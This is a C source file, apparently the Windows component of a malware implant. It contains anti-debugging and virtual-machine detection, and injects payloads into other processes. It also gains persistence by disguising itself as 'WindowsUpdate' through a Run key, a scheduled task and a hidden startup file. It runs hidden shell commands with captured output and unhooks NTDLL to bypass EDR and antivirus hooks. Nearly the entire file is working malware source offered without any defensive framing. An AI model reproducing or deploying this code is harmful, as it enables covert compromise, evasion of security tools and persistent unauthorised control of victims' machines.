/*
 * Windows-specific Implementation
 * Direct syscalls and advanced evasion for Windows
 */

#ifdef _WIN32

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include "../core/commands.h"

// Direct syscall numbers for Windows 10/11
#define SYSCALL_NtAllocateVirtualMemory 0x18
#define SYSCALL_NtProtectVirtualMemory  0x50
#define SYSCALL_NtCreateThread          0xB3
#define SYSCALL_NtWriteVirtualMemory    0x3A

// Function prototypes for undocumented APIs
typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (WINAPI *NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// Direct syscall implementation
__declspec(naked) NTSTATUS NtAllocateVirtualMemory_Syscall(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    __asm {
        mov r10, rcx
        mov eax, SYSCALL_NtAllocateVirtualMemory
        syscall
        ret
    }
}

// Anti-debugging: Check for debugger using multiple methods
int check_debugger_windows() {
    // Method 1: IsDebuggerPresent
    if (IsDebuggerPresent()) {
        return 1;
    }
    
    // Method 2: CheckRemoteDebuggerPresent
    BOOL debuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);
    if (debuggerPresent) {
        return 1;
    }
    
    // Method 3: PEB BeingDebugged flag
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (pPeb->BeingDebugged) {
        return 1;
    }
    
    // Method 4: NtGlobalFlag
    if (pPeb->NtGlobalFlag & 0x70) {
        return 1;
    }
    
    // Method 5: Hardware breakpoints
    CONTEXT context = {0};
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &context)) {
        if (context.Dr0 || context.Dr1 || context.Dr2 || context.Dr3) {
            return 1;
        }
    }
    
    // Method 6: Timing check with RDTSC
    ULONGLONG start = __rdtsc();
    __debugbreak(); // INT 3
    ULONGLONG end = __rdtsc();
    if ((end - start) > 1000) {
        return 1;
    }
    
    return 0;
}

// Anti-VM: Detect virtual machine
int detect_vm_windows() {
    // Check for VM-specific registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; // VirtualBox detected
    }
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 1; // VMware detected
    }
    
    // Check for VM-specific files
    if (GetFileAttributesA("C:\\Windows\\System32\\drivers\\VBoxGuest.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA("C:\\Windows\\System32\\drivers\\vmci.sys") != INVALID_FILE_ATTRIBUTES ||
        GetFileAttributesA("C:\\Windows\\System32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES) {
        return 1;
    }
    
    // Check for VM-specific processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32 = {0};
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (strstr(pe32.szExeFile, "VBoxService.exe") ||
                    strstr(pe32.szExeFile, "VBoxTray.exe") ||
                    strstr(pe32.szExeFile, "VMwareTray.exe") ||
                    strstr(pe32.szExeFile, "VMwareUser.exe")) {
                    CloseHandle(hSnapshot);
                    return 1;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // CPUID check
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 0x40000000);
    
    // Check for hypervisor vendor signatures
    if (cpuInfo[1] == 0x61774D56 || // "VMwa"
        cpuInfo[1] == 0x4B4D564B || // "KVMK"
        cpuInfo[1] == 0x6F727458 || // "Xeno"
        cpuInfo[1] == 0x56425856) { // "VBox"
        return 1;
    }
    
    return 0;
}

// Process injection using multiple techniques
int inject_process_windows(const uint8_t* payload, size_t payload_size, DWORD target_pid) {
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID remoteBuffer = NULL;
    
    // Open target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) {
        return -1;
    }
    
    // Method 1: Classic VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
    remoteBuffer = VirtualAllocEx(hProcess, NULL, payload_size, 
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        CloseHandle(hProcess);
        return -1;
    }
    
    // Write payload
    SIZE_T written;
    if (!WriteProcessMemory(hProcess, remoteBuffer, payload, payload_size, &written)) {
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    
    // Create remote thread
    hThread = CreateRemoteThread(hProcess, NULL, 0,
                                (LPTHREAD_START_ROUTINE)remoteBuffer,
                                NULL, 0, NULL);
    
    if (!hThread) {
        // Fallback: NtCreateThreadEx for better evasion
        NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
        
        if (pNtCreateThreadEx) {
            pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                            remoteBuffer, NULL, 0, 0, 0, 0, NULL);
        }
    }
    
    if (hThread) {
        CloseHandle(hThread);
    }
    
    CloseHandle(hProcess);
    return hThread ? 0 : -1;
}

// Install persistence using multiple methods
int install_persistence_windows() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // Method 1: Registry Run key (HKCU)
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                      (BYTE*)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
    
    // Method 2: Scheduled Task (stealthier)
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
            "schtasks /create /tn \"WindowsUpdate\" /tr \"%s\" /sc onlogon /f /rl highest",
            exePath);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    // Method 3: Copy to startup folder
    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) == S_OK) {
        strcat(startupPath, "\\WindowsUpdate.exe");
        CopyFileA(exePath, startupPath, FALSE);
        
        // Hide the file
        SetFileAttributesA(startupPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    
    return 0;
}

// Execute command with output capture
int execute_command_windows(const char* command, char* output, size_t output_size) {
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return -1;
    }
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWrite;
    si.hStdOutput = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    // Execute command
    char cmdLine[512];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", command);
    
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        return -1;
    }
    
    CloseHandle(hWrite);
    
    // Read output
    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    char buffer[4096];
    
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalBytes + bytesRead < output_size) {
            memcpy(output + totalBytes, buffer, bytesRead);
            totalBytes += bytesRead;
        }
    }
    
    output[totalBytes] = '\0';
    
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return totalBytes;
}

// Unhook NTDLL to bypass EDR/AV hooks
void unhook_ntdll() {
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    
    // Get clean NTDLL from disk
    char ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    strcat(ntdllPath, "\\ntdll.dll");
    
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE,
                                        0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }
    
    LPVOID cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }
    
    // Get .text section
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            // Restore original bytes
            DWORD oldProtect;
            VirtualProtect((LPVOID)((DWORD_PTR)hNtdll + sectionHeader[i].VirtualAddress),
                         sectionHeader[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            
            memcpy((LPVOID)((DWORD_PTR)hNtdll + sectionHeader[i].VirtualAddress),
                  (LPVOID)((DWORD_PTR)cleanNtdll + sectionHeader[i].VirtualAddress),
                  sectionHeader[i].Misc.VirtualSize);
            
            VirtualProtect((LPVOID)((DWORD_PTR)hNtdll + sectionHeader[i].VirtualAddress),
                         sectionHeader[i].Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }
    
    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

#endif // _WIN32